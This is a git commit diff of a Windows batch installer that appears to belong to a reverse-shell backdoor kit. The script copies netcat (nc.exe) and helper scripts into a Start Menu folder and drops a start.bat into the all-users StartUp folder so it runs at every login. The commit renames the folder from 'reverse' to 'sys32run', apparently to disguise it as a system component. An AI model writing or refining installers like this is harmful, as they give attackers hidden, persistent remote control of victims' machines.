990b257ee0ea940e48bc2f021136127bcf3c3de6
strongpapazola <48545591+strongpapazola@users.noreply.github.com>
2020-07-16 14:46:20 +0700

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,8 +1,8 @@
 set /p x=path:
-mkdir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse"
-copy "%x%\1.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
-copy "%x%\2.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
-copy "%x%\nc.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
+mkdir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run"
+copy "%x%\1.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
+copy "%x%\2.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
+copy "%x%\nc.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\sys32run\"
 copy "%x%\start.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start.bat"
 pause
